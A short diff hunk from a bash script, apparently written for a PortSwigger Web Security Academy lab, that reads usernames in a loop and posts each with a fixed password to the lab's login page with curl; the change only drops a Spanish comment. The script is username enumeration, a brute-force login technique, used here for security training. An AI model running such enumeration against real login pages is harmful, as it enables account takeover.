@@ -57,7 +57,6 @@ URL="https://0a5d00730450e252d7fd8d9d006400f4.web-security-academy.net/login"
 HEADERS="Content-Type: application/x-www-form-urlencoded"
 
 while read -r USER; do
-    # Enviar la solicitud con curl
     RESPONSE=$(curl -s -X POST "$URL" \
         -H "$HEADERS" \
         -d "username=$USER&password=test")
